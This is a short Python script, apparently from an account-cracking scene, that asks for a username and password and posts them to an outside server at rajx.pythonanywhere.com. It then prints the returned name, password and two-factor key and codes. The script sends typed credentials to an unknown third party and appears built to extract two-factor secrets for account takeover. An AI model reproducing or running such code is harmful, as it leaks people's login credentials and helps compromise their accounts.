#============================#
import requests,json

print("\ This Site Create By MR.MIVI > Use Chat GPT\\")
uid = input(" Username >> ")
pas = input(" Password >> ")

json_data={
    "email": uid,
    "password": pas,
}
res = requests.post("https://rajx.pythonanywhere.com/2f_live", json=json_data).json()
if res["status"] == 'true':
    print(f" [✔] Name >> {res['name']}")
    print(f" [✔] Uid >> {res['uid']}")
    print(f" [✔] Pas >> {res['pas']}")
    print(f" [✔] 2f_key >> {res['key']}")
    for cd in res['code1']:
        print(f"\\ {cd}")
if res['status'] == 'false':
    print(f" [✘] Error Message >> {res['ERROR']}")
#============================#
